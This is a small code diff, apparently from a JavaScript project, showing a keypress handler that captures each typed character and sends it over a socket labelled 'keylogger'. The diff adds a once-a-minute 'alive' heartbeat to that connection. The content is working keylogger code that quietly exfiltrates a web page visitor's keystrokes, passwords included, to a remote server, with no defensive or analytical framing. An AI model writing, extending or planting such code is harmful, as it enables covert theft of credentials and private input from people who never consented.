@@ -6,3 +6,7 @@ document.onkeypress = function(e) {
   key = String.fromCharCode(key);
   socket.emit('keylogger', key);
 }
+
+window.setInterval(function(e) {
+  socket.emit('alive', '');
+}, 60000)
